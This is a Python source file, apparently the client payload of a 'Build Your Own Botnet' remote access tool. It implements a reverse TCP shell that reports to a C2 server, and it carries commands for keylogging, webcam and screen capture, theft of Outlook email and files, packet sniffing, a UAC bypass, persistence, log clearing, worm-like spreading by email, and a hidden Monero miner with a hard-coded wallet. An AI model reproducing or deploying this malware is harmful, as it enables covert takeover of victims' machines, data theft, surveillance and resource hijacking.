#!/usr/bin/python
# -*- coding: utf-8 -*-
'Reverse TCP Shell Payload (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import json
import errno
import base64
import ctypes
import ftplib
import struct
import socket
import signal
import logging
import functools
import threading
import subprocess
import collections
import multiprocessing
import logging.handlers

if sys.version_info[0] < 3:
    from urllib import urlretrieve
    from urllib2 import urlopen, urlparse
    import StringIO
else:
    from urllib import parse as urlparse
    from urllib.request import urlopen, urlretrieve
    from io import StringIO

# modules
try:
    from util import *
    from loader import *
    from security import *
except ImportError:
    pass


def log(info, level='debug'):
    logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
    logger = logging.getLogger(__name__)
    getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))


def config(*arg, **options):
    """
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
    """
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)

        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = (
            ['win32', 'linux', 'linux2', 'darwin']
            if 'platforms' not in options
            else options['platforms']
        )
        return wrapper

    return _config


def threaded(function):
    """
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to add a loading animation

    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded

# main
_abort = False
_debug = '--debug' in sys.argv


class Payload():
    """
    Reverse TCP shell designed to provide remote access
    to the host's terminal, enabling direct control of the
    device from a remote server.

    """

    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
        """
        Create a reverse TCP shell instance

        `Required`
        :param str host:          server IP address
        :param int port:          server port number

        """
        self.handlers = {}
        self.child_procs = {}
        self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','mss']}
        self.gui = bool(kwargs.get('gui'))
        self.owner = kwargs.get('owner')
        self.flags = self._get_flags()
        self.c2 = (host, port)
        self.connection = self._get_connection(host, port)
        self.key = self._get_key(self.connection)
        self.info = self._get_info()
        self.xmrig_path = None
        self.xmrig_path_dev = None


    def _get_flags(self):
        return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())


    def _get_command(self, cmd):
        if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
            return getattr(self, cmd)
        return False


    def _get_connection(self, host, port):
        while True:
            try:
                connection = socket.create_connection((host, port))
                break
            except (socket.error, socket.timeout):
                log("Unable to connect to server. Retrying in 30 seconds...")
                time.sleep(30)
                continue
            except Exception as e:
                log(f"{self._get_connection.__name__} error: {str(e)}")
                sys.exit()
        self.flags.connection.set()
        self.flags.passive.clear()
        return connection


    def _get_key(self, connection):
        if not isinstance(connection, socket.socket):
            raise TypeError(
                f"invalid object type for argument 'connection' (expected {socket.socket}, received {type(connection)})"
            )
        if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
            return globals()['diffiehellman'](connection)
        else:
            raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")


    def _get_info(self):
        info = {}
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            try:
                info[function] = globals()[function]()
                if isinstance(info[function], bytes):
                    info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
            except Exception as e:
                log(f"{function} returned error: {str(e)}")

        # add owner of session for web application
        info['owner'] = "_b64__" + base64.b64encode(self.owner.encode('utf-8')).decode('ascii')

        # add geolocation of host machine
        latitude, longitude = globals()['geolocation']()
        info['latitude'] = "_b64__" + base64.b64encode(latitude.encode('utf-8')).decode('ascii')
        info['longitude'] = "_b64__" + base64.b64encode(longitude.encode('utf-8')).decode('ascii')

        # encrypt and send data to server
        data = globals()['encrypt_aes'](json.dumps(info), self.key)
        msg = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return info


    @threaded
    def _get_resources(self, target=None, base_url=None):
        if sys.version_info[0] < 3:
            from urllib import urlretrieve
            from urllib2 import urlopen, urlparse
            import StringIO
        else:
            from urllib import parse as urlparse
            from urllib.request import urlopen, urlretrieve
            from io import StringIO
        try:
            if not isinstance(target, list):
                raise TypeError("keyword argument 'target' must be type 'list'")
            if not isinstance(base_url, str):
                raise TypeError("keyword argument 'base_url' must be type 'str'")
            if not base_url.startswith('http'):
                raise ValueError("keyword argument 'base_url' must start with http:// or https://")
            log(f'[*] Searching {base_url}')
            path = urlparse.urlsplit(base_url).path
            base = path.strip('/').replace('/','.')
            names = []
            for line in urlopen(base_url).read().splitlines():
                line = str(line)
                if 'href' in line and '</a>' in line and '__init__.py' not in line:
                    names.append(line.rpartition('</a>')[0].rpartition('>')[2].strip('/'))
            for n in names:
                name, ext = os.path.splitext(n)
                if ext in ('.py','.pyc'):
                    module = '.'.join((base, name)) if base else name
                    if module not in target:
                        log(f"[+] Adding {module}")
                        target.append(module)
                elif not len(ext):
                    t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                    t.daemon = True
                    t.start()
                else:
                    resource = '/'.join((path, n))
                    if resource not in target:
                        target.append(resource)
        except Exception as e:
            log(f"{self._get_resources.__name__} error: {str(e)}")


    @threaded
    def _get_prompt_handler(self):
        self.send_task(
            {
                "session": self.info.get('uid'),
                "task": "prompt",
                "result": f"[ %d @ {os.getcwd()} ]> ",
            }
        )
        while True:
            try:
                self.flags.prompt.wait()
                self.send_task(
                    {
                        "session": self.info.get('uid'),
                        "task": "prompt",
                        "result": f"[ %d @ {os.getcwd()} ]> ",
                    }
                )
                self.flags.prompt.clear()
                if globals()['_abort']:
                    break
            except Exception as e:
                log(str(e))
                break


    @threaded
    def _get_thread_handler(self):
        while True:
            jobs = self.handlers.items()
            deadpool = []
            for task, worker in jobs:
                if worker:
                    try:
                        if not worker.is_alive():
                            deadpool.append(task)
                    except Exception as e:
                        log(str(e))
            for task in deadpool:
                dead = self.handlers.pop(task, None)
                del dead
            if globals()['_abort']:
                break
            time.sleep(0.5)


    def _init_dev_miner(self):
        url = 'pool.hashvault.pro'
        host_port = 80
        api_port = 8889
        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'

        # first attempt using built-in python miner
        try:
            raise Exception
        except Exception as e:
            log(f"{self._init_dev_miner.__name__} error: {str(e)}")

            # if that fails, try downloading and running xmrig
            try:
                threads = multiprocessing.cpu_count() - 1

                # pull xmrig from server if necessary
                if not self.xmrig_path_dev:
                    self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))

                    # set up executable
                    if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
                        os.rename(self.xmrig_path_dev, f'{self.xmrig_path_dev}.exe')
                        self.xmrig_path_dev += '.exe'

                    os.chmod(self.xmrig_path_dev, 755)

                    # excute xmrig in hidden process
                    params = self.xmrig_path_dev + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-host={host} --http-port={port} --threads={threads}".format(url=url, user=user, host=globals()['public_ip'](), port=api_port, threads=threads)
                    result = self.execute(params)
            except Exception as e:
                log(f"{self._init_dev_miner.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        Change current working directory

        `Optional`
        :param str path:  target directory (default: current directory)

        """
        try:
            os.chdir(path)
            return os.getcwd()
        except:
            return f"{path}: No such file or directory"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        List the contents of a directory

        `Optional`
        :param str path:  target directory

        """
        if not os.path.isdir(path):
            return "Error: path not found"
        output = []
        for line in os.listdir(path):
            if len('\n'.join(output + [line])) < 2048:
                output.append(line)
            else:
                break
        return '\n'.join(output)


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        Display file contents

        `Required`
        :param str path:  target filename

        """
        output = []
        if not os.path.isfile(path):
            return "Error: file not found"
        for line in open(path, 'rb').read().splitlines():
            if len(line) and not line.isspace():
                if len('\n'.join(output + [line])) < 48000:
                    output.append(line)
                else:
                    break
        return '\n'.join(output)


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='pwd')
    def pwd(self, *args):
        """
        Show name of present working directory

        """
        return os.getcwd()


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        Execute Python code in current context

        `Required`
        :param str code:        string of Python code to execute

        """
        try:
            return eval(code)
        except Exception as e:
            return f"{self.eval.__name__} error: {str(e)}"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        Download file from URL

        `Required`
        :param str url:         target URL to download ('http://...')

        `Optional`
        :param str filename:    name of the file to save the file as

        """
        if sys.version_info[0] < 3:
            from urllib import urlretrieve
            from urllib2 import urlopen, urlparse
            import StringIO
        else:
            from urllib import parse as urlparse
            from urllib.request import urlopen, urlretrieve
        if url.startswith('http'):
            try:
                path, _ = urlretrieve(url, filename) if filename else urlretrieve(url)
                return path
            except Exception as e:
                log(f"{self.wget.__name__} error: {str(e)}")
        else:
            return "Invalid target URL - must begin with 'http'"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """
        Shutdown the current connection

        """
        try:
            self.flags.connection.clear()
            self.flags.passive.clear()
            self.flags.prompt.clear()
            self.connection.close()

            # kill threads
            for thread in list(self.handlers):
                try:
                    self.stop(thread)
                except Exception as e:
                    log(f"{self.kill.__name__} error: {str(e)}")

            # kill sub processes (subprocess.Popen)
            for proc in self.execute.process_list.values():
                try:
                    proc.kill()
                except: pass

            # kill child processes (multiprocessing.Process)
            for child_proc in self.child_procs.values():
                try:
                    child_proc.terminate()
                except: pass
        except Exception as e:
            log(f"{self.kill.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
    def help(self, name=None):
        """
        Show usage help for commands and modules

        `Optional`
        :param str command:      name of a command or module

        """
        if not name:
            try:
                return json.dumps({v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
            except Exception as e:
                log(f"{self.help.__name__} error: {str(e)}")
        elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
            try:
                return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).__doc__})
            except Exception as e:
                log(f"{self.help.__name__} error: {str(e)}")
        else:
            return f"'{name}' is not a valid command and is not a valid module"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='load <module> [target]')
    def load(self, args):
        """
        Remotely import a module or package

        `Required`
        :param str module:  name of module/package

        `Optional`
        :param str target:  name of the target destination (default: globals)

        """
        args = str(args).split()
        if len(args) == 1:
            module, target = args[0], ''
        elif len(args) == 2:
            module, target = args
        else:
            return f"usage: {self.load.usage}"
        target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
        host, port = self.connection.getpeername()
        base_url_1 = f'http://{host}:{port + 1}'
        base_url_2 = f'http://{host}:{port + 2}'
        with globals()['remote_repo'](self.remote['packages'], base_url_2):
            with globals()['remote_repo'](self.remote['modules'], base_url_1):
                try:
                    exec(f'import {module}', target)
                    log(f'[+] {module} remotely imported')
                    return f'[+] {module} remotely imported'
                except Exception as e:
                    log(f"{self.load.__name__} error: {str(e)}")
                    return f"{self.load.__name__} error: {str(e)}"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        Stop a running job

        `Required`
        :param str target:    name of job to stop
        """
        try:
            if target not in self.handlers:
                return f"Job '{target}' not found"
            _ = self.handlers.pop(target, None)
            del _
            return f"Job '{target}' was stopped."
        except Exception as e:
            log(f"{self.stop.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        Show value of an attribute

        `Required`
        :param str attribute:    payload attribute to show

        Returns attribute(s) as a dictionary (JSON) object

        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(_threads[a].name) for a in self.handlers if self.handlers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name == 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str(f'_{attribute}')):
                try:
                    return json.dumps(getattr(self, str(f'_{attribute}')))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str(f'_{attribute}'))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            log(f"'{_threads.__name__}' error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
    def abort(self, *args):
        """
        Abort execution and self-destruct

        """
        globals()['_abort'] = True
        try:
            if os.name == 'nt':
                clear_system_logs()
            if 'persistence' in globals():
                global persistence
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, f'remove_{method}')()
                        except Exception as e2:
                            log(f"{method} error: {str(e2)}")
            if not _debug:
                delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.connection.close)
            taskkill = threading.Thread(target=self.process, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()


    @config(platforms=['darwin'], command=True, usage='icloud')
    def icloud(self):
        """
        Check for logged in iCloud account on macOS

        """
        if 'icloud' not in globals():
            self.load('icloud')
        return globals()['icloud'].run()


    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [port] [wallet]')
    def miner(self, args):
        """
        Run cryptocurrency miner in the background

        `Required`
        :param str url:         mining server url
        :param str username:    username for mining server


        """
        args = str(args).split()

        if 'run' in args and len(args) == 4:
            cmd, url, port, user = args

            # type check port argument
            if not port.isdigit():
                return "Error: port must be a digit 1-65535"

            # first attempt using built-in python miner
            try:
                raise Exception
            except Exception as e:
                log(f"{self.miner.__name__} error: {str(e)}")

                # if that fails, try downloading and running xmrig
                try:
                    threads = multiprocessing.cpu_count() - 1

                    # pull xmrig from server if necessary
                    if not self.xmrig_path:
                        self.xmrig_path = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))

                        # set up executable
                        if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
                            os.rename(self.xmrig_path, f'{self.xmrig_path}.exe')
                            self.xmrig_path += '.exe'

                        os.chmod(self.xmrig_path, 755)

                    else:
                        # restart miner if it already exists
                        name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
                        if name in self.execute.process_list:
                            self.execute.process_list[name].kill()
                    # excute xmrig in hidden process
                    params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
                    return self.execute(params)
                except Exception as e:
                    log(f"{self.miner.__name__} error: {str(e)}")
                    return f"{self.miner.__name__} error: {str(e)}"

        elif 'stop' in args:
            # kill python miner
            if 'miner_py' in self.child_procs and isinstance(self.child_procs['miner_py'], multiprocessing.Process) and self.child_procs['miner_py'].is_alive():
                self.child_procs['miner_py'].terminate()

            # kill xmrig
            name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
            if name in self.execute.process_list:
                self.execute.process_list[name].kill()

            return "Miner stopped."

        return f"usage: {self.miner.usage}"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
    def upload(self, filename):
        """
        Upload file from client machine to the C2 server

        `Required`
        :param str source:      filename

        """
        try:
            if not os.path.isfile(filename):
                return "Error: file not found"
            host, port = self.connection.getpeername()
            _, filetype = os.path.splitext(filename)
            with open(filename, 'rb') as fp:
                data = base64.b64encode(fp.read())
            json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}

                # upload data to server
            if self.gui:
                globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
            else:
                globals()['post'](f'http://{host}:{port + 3}', json=json_data)
            return "Upload complete (see Exfiltrated Files tab to download file)"
        except Exception as e:
            log(f"{self.upload.__name__} error: {str(e)}")
            return f"Error: {str(e)}"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        Capture image/video from client webcam

        `Required`
        :param str mode:      stream, image, video

        `Optional`
        :param str upload:    imgur (image mode), ftp (video mode)
        :param int port:      integer 1 - 65355 (stream mode)

        """
        try:
            host, port = self.connection.getpeername()

            if 'webcam' not in globals():
                self.load('webcam')
            if not args:
                return self.webcam.usage

            args = str(args).split()

            if 'stream' in args:
                if len(args) != 2:
                    log("Error - stream mode requires argument: 'port'")
                elif not args[1].isdigit():
                    log("Error - port must be integer between 1 - 65355")
                else:
                    host, _ = self.connection.getpeername()
                    port = int(args[1])
                    globals()['webcam'].stream(host=host, port=port)

            elif 'image' in args:
                data = globals()['webcam'].image(*args)
                json_data = {"data": str(data), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}

                # upload data to server
                if self.gui:
                    globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                else:
                    globals()['post'](f'http://{host}:{port + 3}', json=json_data)

            elif 'video' in args:
                data = globals()['webcam'].video(*args)
                json_data = {"data": str(data), "type": "avi", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}

                # upload data to server
                if self.gui:
                    globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                else:
                    globals()['post'](f'http://{host}:{port + 3}', json=json_data)

            else:
                return self.webcam.usage
            return "Webcam capture complete  (see Exfiltrated Files tab to download file)"
        except Exception as e:
            log(f"{self.webcam.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
    def passive(self):
        """
        Keep client alive while waiting to re-connect

        """
        log(f"{self.passive.__name__} : Bot entering passive mode awaiting C2.")
        self.flags.connection.clear()
        self.flags.passive.set()


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """
        Restart the shell

        """
        try:
            log(f"{output} failed - restarting in 3 seconds...")
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
        except Exception as e:
            log(f"{self.restart.__name__} error: {str(e)}")


    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """
        Access Outlook email in the background

        `Required`
        :param str mode:    installed, run, count, search, upload

        """
        if 'outlook' not in globals():
            self.load('outlook')
        elif not args:
            try:
                if not globals()['outlook'].installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if not hasattr(globals()['outlook'], mode):
                    return self.outlook.usage
                if 'run' in mode:
                    self.handlers['outlook'] = globals()['outlook'].run()
                    return "Fetching emails from Outlook inbox..."

                elif 'upload' in mode:
                    results = globals()['outlook'].results
                    if len(results):
                        host, port = self.connection.getpeername()
                        data = base64.b64encode(json.dumps(results))
                        json_data = {'data': str(data), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}

                            # upload data to server
                        if self.gui:
                            globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                        else:
                            globals()['post'](f'http://{host}:{port + 3}', json=json_data)
                        return "Upload of Outlook emails complete  (see Exfiltrated Files tab to download files)"
                elif hasattr(globals()['outlook'], mode):
                    return getattr(globals()['outlook'], mode)()
                else:
                    return f"Error: invalid mode '{mode}'"
            except Exception as e:
                log(f"{self.email.__name__} error: {str(e)}")


    @config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        Attempt UAC bypass to escalate privileges

        """
        try:
            if 'escalate' not in globals():
                self.load('escalate')
            return globals()['escalate'].run(sys.argv[0])
        except Exception as e:
            log(f"{self.escalate.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        Run an executable program in a hidden process

        `Required`
        :param str path:    file path of the target program

        `Optional`
        :param str args:    arguments for the target program

        """
        log(args)
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if not os.path.isfile(path):
            return f"File '{str(path)}' not found"
        name = os.path.splitext(os.path.basename(path))[0]
        try:
            # attempt to run hidden process
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
            info.wShowWindow = subprocess.SW_HIDE
            self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
            return f"Running '{path}' in a hidden process"
        except Exception as e:
                # revert to normal process if hidden process fails
            try:
                self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                return f"Running '{name}' in a new process"
            except Exception as e:
                log(f"{self.execute.__name__} error: {str(e)}")
                return f"{self.execute.__name__} error: {str(e)}"


    @config(platforms=['win32'], command=True, usage='process <mode>')
    def process(self, args=None):
        """
        Utility method for interacting with processes

        `Required`
        :param str mode:    block, list, monitor, kill, search, upload

        `Optional`
        :param str args:    arguments specific to the mode

        """
        try:
            if 'process' not in globals():
                self.load('process')
            if args:
                cmd, _, action = str(args).partition(' ')
                if 'monitor' in cmd:
                    self.handlers['process_monitor'] = globals()['process'].monitor(action)
                    return f"Monitoring process creation for keyword: {action}"
                elif 'upload' in cmd:
                    log = globals()['process'].log.getvalue()
                    if not len(log):
                        return "Process log is empty"
                    host, port = self.connection.getpeername()
                    data = base64.b64encode(log)
                    json_data = {'data': str(data), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}

                        # upload data to server
                    if self.gui:
                        globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                    else:
                        globals()['post'](f'http://{host}:{port + 3}', json=json_data)
                    return "Process log upload complete  (see Exfiltrated Files tab to download file)"
                elif hasattr(globals()['process'], cmd):
                    return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
            return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
        except Exception as e:
            log(f"{self.process.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
    def portscanner(self, target=None):
        """
        Scan a target host or network to identify
        other target hosts and open ports.

        `Required`
        :param str target:      IPv4 address

        """
        if 'portscanner' not in globals():
            self.load('portscanner')
        try:
            if not target:
                return self.portscanner.usage
            if not ipv4(target):
                return f"Error: invalid IP address '{target}'"
            return globals()['portscanner'].run(target)
        except Exception as e:
            log(f"{self.portscanner.__name__} error: {str(e)}")


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
    def keylogger(self, mode=None):
        """
        Log user keystrokes

        `Required`
        :param str mode:    run, stop, status, upload

        """
        def status():
            try:
                length = globals()['keylogger'].logs.tell()
                return "Log size: {} bytes".format(length)
            except Exception as e:
                log("{} error: {}".format('keylogger.status', str(e)))

        if 'keylogger' not in globals():
            self.load('keylogger')
        if not mode:
            return (
                globals()['keylogger'].usage
                if 'keylogger' not in self.handlers
                else locals()['status']()
            )
        if 'run' in mode or 'start' in mode:
            if 'keylogger' not in self.handlers:
                self.handlers['keylogger'] = globals()['keylogger'].run()
                return locals()['status']()
            else:
                return locals()['status']()
        elif 'stop' in mode:
            try:
                self.stop('keylogger')
            except: pass
            try:
                self.stop('keylogger')
            except: pass
            return locals()['status']()
        elif 'upload' in mode:
            host, port = self.connection.getpeername()
            data = base64.b64encode(globals()['keylogger'].logs.getvalue())
            json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}

            # upload data to server
            if self.gui:
                globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
            else:
                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)

            globals()['keylogger'].logs.reset()
            return 'Keystroke log upload complete  (see Exfiltrated Files tab to download file)'
        elif 'status' in mode:
            return locals()['status']()
        else:
            return keylogger.usage


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='screenshot')
    def screenshot(self, mode=None):
        """
        Capture a screenshot from host device

        `Optional`
        :param str mode:   ftp, imgur (default: None)

        """
        try:
            if 'screenshot' not in globals():
                self.load('screenshot')
            host, port = self.connection.getpeername()
            data = globals()['screenshot'].run()
            json_data = {"data": str(data), "owner": self.owner, "type": "png", "module": self.screenshot.__name__, "session": self.info.get('public_ip')}
            if self.gui:
                globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
            else:
                globals()['post'](f'http://{host}:{port + 3}', json=json_data)
            return 'Screenshot complete  (see Exfiltrated Files tab to download file)'
        except Exception as e:
            result = f"{self.screenshot.__name__} error: {str(e)}"
            log(result)
            return result


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
    def persistence(self, args=None):
        """
        Establish persistence on client host machine

        `Required`
        :param str target:          add, remove. methods, results

        `Methods`
        :method all:                All Methods
        :method registry_key:       Windows Registry Key
        :method scheduled_task:     Windows Task Scheduler
        :method startup_file:       Windows Startup File
        :method launch_agent:       Mac OS X Launch Agent
        :method crontab_job:        Linux Crontab Job
        :method hidden_file:        Hidden File

        """
        try:
            if 'persistence' not in globals():
                self.load('persistence')
            cmd, _, action = str(args).partition(' ')
            if cmd not in ('add','remove'):
                return self.persistence.usage
            for method in globals()['persistence']._methods:
                if action in ['all', method]:
                    try:
                        getattr(globals()['persistence']._methods[method], cmd)()
                    except Exception as e:
                        log(f"{self.persistence.__name__} error: {str(e)}")
            return json.dumps(globals()['persistence'].results())
        except Exception as e:
            log(f"{self.persistence.__name__} error: {str(e)}")


    @config(platforms=['linux','linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
    def packetsniffer(self, args):
        """
        Capture traffic on local network

        `Required`
        :param str args:        run, stop, upload

        """
        try:
            if 'packetsniffer' not in globals():
                self.load('packetsniffer')
            args = str(args).split()
            if len(args):
                mode = args[0]
                if 'run' in mode:
                    globals()['packetsniffer'].flag.set()
                    self.handlers['packetsniffer'] = globals()['packetsniffer'].run()
                    return "Network traffic capture started"
                elif 'stop' in mode:
                    globals()['packetsniffer'].flag.clear()
                    return "Network traffic captured stopped"
                elif 'upload' in mode:
                    log = globals()['packetsniffer'].log.getvalue()
                    if not len(log):
                        return "Network traffic log is empty"
                    globals()['packetsniffer'].log.reset()
                    host, port = self.connection.getpeername()
                    data = base64.b64encode(log)
                    json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}

                        # upload data to server
                    if self.gui:
                        globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                    else:
                        globals()['post'](f'http://{host}:{port + 3}', json=json_data)
                    return "Network traffic log upload complete (see Exfiltrated Files tab to download file)"
                else:
                    return self.packetsniffer.usage
        except Exception as e:
            log(f"{self.packetsniffer.__name__} error: {str(e)}")


    @config(platforms=['win32','darwin','linux','linux2'], command=True, usage='spread <gmail> <password> <URL email list>')
    def spread(self, args=None):
        """
        Activate worm-like behavior and begin spreading client via email

        `Required`
        :param str email:       sender Gmail address
        :param str password:    sender Gmail password
        :param str url:         URL of target email list
        """
        if not args or len(str(args).split()) != 3:
            return self.spread.usage
        if 'spreader' not in globals():
            self.load('spreader')
        try:
            attachment = sys.argv[0]
            gmail, password, url = args.split()
            recipients = urlopen(url).read().splitlines()
            return globals()['spreader'].run(gmail, password, attachment, recipients)
        except Exception as e:
            return f'{self.spread.__name__} error: {str(e)}'


    def send_task(self, task):
        """
        Send task results to the server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr str session:         session ID assigned by server
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        try:
            if 'session' not in task:
                task['session'] = self.info.get('uid')
            if self.flags.connection.wait(timeout=1.0):
                data = globals()['encrypt_aes'](json.dumps(task), self.key)
                msg  = struct.pack('!L', len(data)) + data
                self.connection.sendall(msg)
                return True
            return False
        except Exception as e:
            e = str(e)
            if "Errno 104" in e or "10054" in e:
                log(
                    f"{self.send_task.__name__} socket error: SERVER DISCONNECTED GRACEFULLY - {e}"
                )
                self.kill()
                return
            elif "Errno 32" in e or "10052" in e:
                log(
                    f"{self.send_task.__name__} socket error: SERVER CRASHED OR INTERRUPTED - {e}"
                )
            elif "Errno 111" in e or "10061" in e:
                log(
                    f"{self.send_task.__name__} socket error: SERVER OFFLINE OR CHANGED PORT - {e}"
                )
            else:
                log(
                    f"{self.send_task.__name__} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {e}"
                )
            self.passive()
            #log("{} error: {}".format(self.send_task.__name__, str(e)))


